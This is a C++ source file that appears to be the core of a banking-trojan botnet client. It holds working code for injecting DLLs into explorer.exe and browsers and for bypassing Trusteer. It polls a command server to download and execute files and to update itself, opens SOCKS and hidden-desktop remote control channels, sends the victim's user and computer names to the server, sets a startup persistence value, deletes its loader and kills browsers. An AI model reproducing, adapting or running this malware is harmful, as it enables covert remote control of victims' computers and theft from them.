#include "Bot.h"
#include "Socks.h"
#include "HiddenDesktop.h"

BYTE  *g_dll32 = NULL;
BYTE  *g_dll64 = NULL;
int    g_dll32size;
int    g_dll64size;
HANDLE g_hBotExe;
HANDLE g_hBotMutex;
DWORD  g_hBrowserPids2kill[MAX_PATH] = { 0 };

static void InjectPid(DWORD pid)
{
   // open the process for injection
   HANDLE hProcess = Funcs::pOpenProcess
   (
      PROCESS_VM_OPERATION |
      PROCESS_VM_READ | 
      PROCESS_VM_WRITE | 
      PROCESS_CREATE_THREAD | 
      PROCESS_QUERY_INFORMATION, 
      FALSE, 
      pid
   );
   // check if it is x64 process
   BOOL   x64      = IsProcessX64(hProcess);
   // choose a suitable dll
   BYTE *dllBuffer = x64 ? g_dll64 : g_dll32;
   // inject dll
   BOOL injected   = InjectDll(dllBuffer, hProcess, x64);
   Funcs::pCloseHandle(hProcess);
}

static DWORD WINAPI InjectionServerThread(LPVOID lpParam)
{
   // the code of this fucntion is self explanatory enough
   char pipeName[MAX_PATH] = { 0 };
   char botId[BOT_ID_LEN]  = { 0 };
   GetBotId(botId);
   Funcs::pWsprintfA(pipeName, Strs::pipeName, botId); 
   HANDLE hPipe = Funcs::pCreateNamedPipeA
   (
      pipeName, 
      PIPE_ACCESS_DUPLEX, 
      PIPE_TYPE_BYTE, 
      PIPE_UNLIMITED_INSTANCES, 
      0, 
      0,
      0, 
      NULL
   );
   for(;;)
   {
      Funcs::pConnectNamedPipe(hPipe, NULL);
      DWORD pid;
      BOOL  trusteer;
      DWORD readWrite;
      Funcs::pReadFile(hPipe, &pid, sizeof(pid), &readWrite, NULL);
      Funcs::pReadFile(hPipe, &trusteer, sizeof(trusteer), &readWrite, NULL);
      if(trusteer)
      {
         char  browserPath[MAX_PATH] = { 0 };
         int   browserPathLen;
         Funcs::pReadFile(hPipe, &browserPathLen, sizeof(browserPathLen), &readWrite, NULL);
         Funcs::pReadFile(hPipe, browserPath, browserPathLen, &readWrite, NULL);

         char  commandLine[MAX_PATH] = { 0 };
         int   commandLineLen;
         Funcs::pReadFile(hPipe, &commandLineLen, sizeof(commandLineLen), &readWrite, NULL);
         Funcs::pReadFile(hPipe, commandLine, commandLineLen, &readWrite, NULL);
         pid = BypassTrusteer(NULL, browserPath, commandLine);
      }
      InjectPid(pid);
      Funcs::pDisconnectNamedPipe(hPipe);
   }
   return 0;
}

static void LockBotExe()
{
   CHAR botPath[MAX_PATH] = { 0 };
   // get bots executable installed in appdata
   GetInstallPath(botPath);
   // open this file for reading in order to prevent from reading it by other programms
   g_hBotExe = Funcs::pCreateFileA(botPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
}

static BOOL DownloadExecute(char *url, char *tempPath, BOOL execute, BOOL validateExe)
{
   // initialize http request
   URL_COMPONENTSA urlComponents = { 0 };
   urlComponents.dwStructSize = sizeof(urlComponents);

   char host[MAX_PATH] = { 0 };
   char path[MAX_PATH] = { 0 };
   urlComponents.lpszHostName     = host;
   urlComponents.dwHostNameLength = MAX_PATH;

   urlComponents.lpszUrlPath     = path;
   urlComponents.dwUrlPathLength = MAX_PATH;

   if(Funcs::pInternetCrackUrlA(url, Funcs::pLstrlenA(url), ICU_DECODE, &urlComponents) && urlComponents.nScheme == INTERNET_SCHEME_HTTP)
   {
      HttpRequestData request = { 0 };
      request.host            = urlComponents.lpszHostName;
      request.port            = urlComponents.nPort;
      request.path            = urlComponents.lpszUrlPath;
      request.post            = FALSE;
      // send http request
      if(HttpSubmitRequest(request))
      {
         // verify that response is an executable file if it is necessary
         if((validateExe && VerifyPe(request.outputBody, request.outputBodySize)) || !validateExe)
         {
            // get the name of the downloaded file on the server (path is in url format. does it always work?)
            char *fileName = Funcs::pPathFindFileNameA(path);
            if(fileName != path)
            {
               // get path to temp folder
               Funcs::pGetTempPathA(MAX_PATH, tempPath);
               // get a random file name with .TMP extention in file folder
               Funcs::pGetTempFileNameA(tempPath, "", 0, tempPath);
               // append the original file name to the path to the temp file
               Funcs::pLstrcatA(tempPath, ".");
               Funcs::pLstrcatA(tempPath, fileName);
               // create temp file
               HANDLE hFile = Funcs::pCreateFileA(tempPath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
               if(hFile)
               {
                  DWORD written;
                  // write there the content of the downloaded file
                  if(Funcs::pWriteFile(hFile, request.outputBody, request.outputBodySize, &written, NULL))
                  {
                     Funcs::pFree(request.outputBody);
                     Funcs::pCloseHandle(hFile);
                     if(!execute)
                        return TRUE;
                     // open the downloaded file with displayed window
                     if(Funcs::pShellExecuteA(NULL, Strs::open, tempPath, NULL, NULL, SW_SHOW) > (HINSTANCE) 32)
                        return TRUE; 
                  }
                  Funcs::pCloseHandle(hFile);    
               } 
            }
         }  
      }
      Funcs::pFree(request.outputBody);
   }
   return FALSE;
}

enum CommandType { COMMAND_DL_EXEC, COMMAND_HIDDEN_DESKTOP, COMMAND_SOCKS, COMMAND_UPDATE };

static void HandleCommand(CommandType type, char *param)
{
   switch(type)
   {
      case COMMAND_DL_EXEC:
      {
         char tempPath[MAX_PATH] = { 0 };
         // execute a file downloaded from url stored in param and execute it (it can be any file which function shellexecute can open. for example exe or bat)
         DownloadExecute(param, tempPath, TRUE, FALSE);
         break;
      }
      case COMMAND_UPDATE:
      {
         char tempPath   [MAX_PATH] = { 0 };
         char installPath[MAX_PATH] = { 0 };
         // download a PE file in temp folder (path to this file is stored in tempPath)
         if(DownloadExecute(param, tempPath, FALSE, TRUE))
         {
            // get the path to the file in appdata
            GetInstallPath(installPath);
            // unlock the file (locked in startbot)
            Funcs::pCloseHandle(g_hBotExe);
            // replace the old file with downloaded one
            Funcs::pCopyFileA(tempPath, installPath, FALSE);
            // lock this file again
            LockBotExe();
         }
         break;
      }
      case COMMAND_SOCKS:
      case COMMAND_HIDDEN_DESKTOP:
      {
         char *host = param;
         char *port = Funcs::pStrChrA(param, ':');
         if(port)
         {
            // terminate the param string (param is located before the null character and port is located after this character)
            *port = 0;
            ++port;
            // get the port number
            int portInt = Funcs::pStrtol(port, NULL, 10);
            // choose the methos of connection to this host
            if(type == COMMAND_SOCKS)
               // run socks server module
               StartSocksClient(host, portInt);
            else
               // run pseudo VNC module
               StartHiddenDesktop(host, portInt);
         }
         break;
      }
   }
}

#pragma region hackBrowsers
/*
   For the niche case where someone never closes his browser or shuts down his computer
   I also can't just restart the browser since I need to disable spdy/http2
*/
static DWORD WINAPI KillBrowsersThread(LPVOID lpParam)
{
   // sleep 30 min
   Funcs::pSleep(1000 * 60 * 30);
   // kill all browsers previously written in the list
   for(int i = 0; i < sizeof(g_hBrowserPids2kill); ++i)
   {
      if(!g_hBrowserPids2kill[i])
         break;
      HANDLE hProcess = Funcs::pOpenProcess(PROCESS_TERMINATE, FALSE, g_hBrowserPids2kill[i]);
      Funcs::pTerminateProcess(hProcess, 0);
      Funcs::pCloseHandle(hProcess);
   }
   return 0;
}

static void StartKillBrowsersThread()
{
   // get list of all processes
   PROCESSENTRY32 processEntry = { 0 };
   processEntry.dwSize         = sizeof(processEntry);
   HANDLE hProcessSnap         = Funcs::pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   DWORD browserPidsNum        = 0;
   Funcs::pProcess32First(hProcessSnap, &processEntry);
   // for each process check if it is a browser
   do
   {
      if(Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::chromeExe) == 0 ||
         Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::firefoxExe) == 0 ||
         Funcs::pLstrcmpiA(processEntry.szExeFile, Strs::iexploreExe) == 0)
      {
         // add PID of found browser in kill list
         if(sizeof(g_hBrowserPids2kill) > browserPidsNum)
         {
            g_hBrowserPids2kill[browserPidsNum] = processEntry.th32ProcessID;
            ++browserPidsNum;
         }
      }
   } while(Funcs::pProcess32Next(hProcessSnap, &processEntry));
   Funcs::pCloseHandle(hProcessSnap);
   Funcs::pCreateThread(NULL, 0, KillBrowsersThread, NULL, 0, NULL);
}
#pragma endregion

static void SendBotInfo()
{
   char             command[MAX_PATH]  = { 0 };
   char            *userNameA;
   char            *compNameA;
   wchar_t          userName[MAX_PATH] = { 0 };
   wchar_t          compName[MAX_PATH] = { 0 };
   DWORD            nameSize           = MAX_PATH;
   SYSTEM_INFO      info               = { 0 };
   OSVERSIONINFOEXA osVersion          = { 0 };

   // get names
   Funcs::pGetUserNameW(userName, &nameSize);
   nameSize = MAX_PATH;
   Funcs::pGetComputerNameW(compName, &nameSize);

   // convert names
   userNameA = Utf16toUtf8(userName);
   compNameA = Utf16toUtf8(compName);

   // get systen info
   Funcs::pGetNativeSystemInfo(&info);
   osVersion.dwOSVersionInfoSize = sizeof(osVersion);
   Funcs::pGetVersionExA((LPOSVERSIONINFOA) &osVersion); 
   // create a string containing gathered information separated by pipeline symbol
   Funcs::pWsprintfA
   (
      command, 
      Strs::infoRequest, 
      osVersion.dwMajorVersion, 
      osVersion.dwMinorVersion, 
      osVersion.wServicePackMajor, 
      !(osVersion.wProductType == VER_NT_WORKSTATION), 
      compNameA, 
      userNameA, 
      (info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
   );
   // send created string on the server
   char *toFree = PanelRequest(command, NULL);
   Funcs::pFree(toFree);
}

static DWORD WINAPI CommandPollThread(LPVOID lpParam)
{ 
   for(;;)
   {
      //just placed here because we poll
      char installPath[MAX_PATH] = { 0 };
      GetInstallPath(installPath);
      SetStartupValue(installPath);
      //start of real command poll
      char command[32]    = { 0 };
      // send ping command to te server
      Funcs::pLstrcpyA(command, Strs::pingRequest);
      char *startResponse = PanelRequest(command, NULL);
      char *response      = startResponse;
      if(response)
      {
         // first response
         if(!Funcs::pLstrcmpA(response, "0"))
            SendBotInfo();
         else
         {
            for(;;)
            {
               char *commandTypeStr = response;
               // find param separator
               char *param       = Funcs::pStrChrA(response, '|');
               // find command separator
               char *nextCommand = Funcs::pStrStrA(response, Strs::winNewLine);
               // if next command is found
               if(nextCommand)
               {
                  // delete found separator (windows new line characters) and terminate the string (each command has only one parameter which is stored between param separator and command separator)
                  *nextCommand = 0;
                  // goto the next command and skip command separator
                  response     = nextCommand + 2;
               }
               // if next parameter is found
               if(param)
               {
                  // delete found separator (pipeline character)
                  *param = 0;
                  // skip the separator
                  ++param;
                  // get the command number
                  CommandType type = (CommandType) Funcs::pStrtol(commandTypeStr, NULL, 10);
                  // execute the command
                  HandleCommand(type, param);
               }
               // terminate the loop
               if(!nextCommand)
                  break;
            }
         }      
      }
      Funcs::pFree(startResponse);
      Funcs::pSleep(POLL); 
   }
   return 0;
}

static HANDLE InjectExplorer()
{
   // get pid of explorer.exe
   DWORD pid = GetPidExplorer();
   // inject current dll in explorer.exe
   InjectPid(pid);
   return Funcs::pOpenProcess(SYNCHRONIZE, FALSE, pid);
}

static void UpdateDllsThread()
{
   for(;;)
   {
      // replace old dlls in temp folder with new ones
      GetDlls(NULL, NULL, TRUE);
      // sleep 5 mins
      Funcs::pSleep(1000 * 60 * 5);
   }
}

static DWORD WINAPI InjectExplorerThread(LPVOID lpParam)
{
   // infinitely inject explorer.exe after every restart
   for(;;)
   {
      // inject explorer.exe
      HANDLE hExplorer = InjectExplorer();
      // wait for its termination (restart)
      Funcs::pWaitForSingleObject(hExplorer, INFINITE);
      Funcs::pCloseHandle(hExplorer);
   }
   return 0;
}

static void Melt()
{
   char temp[MAX_PATH];
   // temp = path to temp folder + botid (this name belongs to a file where loader wrote the path to original PE file launched by the user)
   GetTempPathBotPrefix(temp);
   // open this file for reading
   HANDLE hFile = Funcs::pCreateFileA
   (
      temp, 
      GENERIC_READ, 
      0, 
      NULL, 
      OPEN_EXISTING, 
      FILE_ATTRIBUTE_NORMAL, 
      NULL
   );
   if(hFile != INVALID_HANDLE_VALUE)
   {
      // delete zone identifier of loader in appdata
      char exeZoneId[MAX_PATH];
      GetInstallPath(exeZoneId);
      Funcs::pLstrcatA(exeZoneId, Strs::zoneId);
      Funcs::pDeleteFileA(exeZoneId);

      // delete original loader executable and the file with its (original loader exe) path in temp folder
      DWORD fileSize = Funcs::pGetFileSize(hFile, NULL);
      DWORD read;
      char deletePath[MAX_PATH];
      Funcs::pReadFile(hFile, deletePath, fileSize, &read, NULL);
      Funcs::pCloseHandle(hFile);
      Funcs::pDeleteFileA(deletePath);
      Funcs::pDeleteFileA(temp);
      StartKillBrowsersThread(); //on first run
   }
}

// runs only when x86 dll injected in dllhost.exe
void StartBot()
{          
   char botId[BOT_ID_LEN] = { 0 };
   // check if the bot already exists
   GetBotId(botId);
   HANDLE g_hBotMutex = Funcs::pCreateMutexA(NULL, TRUE, botId);
   if(Funcs::pGetLastError() == ERROR_ALREADY_EXISTS)
      Funcs::pExitProcess(0);

   // lock bots executable in appdata
   LockBotExe();

   // download both dlls
   GetDlls(&g_dll32, &g_dll64, FALSE);
   // delete files left after first launch
   Melt();
   Funcs::pCreateThread(NULL, 0, InjectExplorerThread, NULL, 0, NULL);
   Funcs::pCreateThread(NULL, 0, InjectionServerThread, NULL, 0, NULL);
   // send information about PC on the server
   SendBotInfo();
   Funcs::pCreateThread(NULL, 0, CommandPollThread, NULL, 0, NULL);
   // run infinity loop of downloading dlls from the server
   UpdateDllsThread();
}
